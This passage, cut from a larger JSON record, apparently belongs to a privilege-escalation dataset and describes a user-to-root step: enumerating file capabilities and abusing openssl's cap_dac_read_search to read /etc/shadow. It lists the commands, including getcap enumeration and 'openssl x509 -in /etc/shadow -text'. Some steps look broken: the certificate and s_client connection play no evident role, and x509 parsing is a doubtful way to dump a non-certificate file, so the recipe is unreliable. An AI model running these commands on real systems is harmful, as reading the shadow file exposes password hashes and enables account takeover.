        {
          "from": "user",
          "to": "root",
          "technique": "openssl cap_dac_read_search capability → read /etc/shadow",
          "commands": [
            {"cmd": "getcap -r / 2>/dev/null", "rationale": "Why: Capabilities may allow reading /etc/shadow"},
            "# openssl has cap_dac_read_search: can read any file",
            "openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem",
            "openssl s_client -connect localhost:443 -cert cert.pem -key key.pem",
            "# Or: use openssl to read /etc/shadow via capability",
            {"cmd": "openssl x509 -in /etc/shadow -text", "rationale": "Why: cap_dac_read_search lets openssl read any file"}
          ]
        }
      ],
      "credentials": [
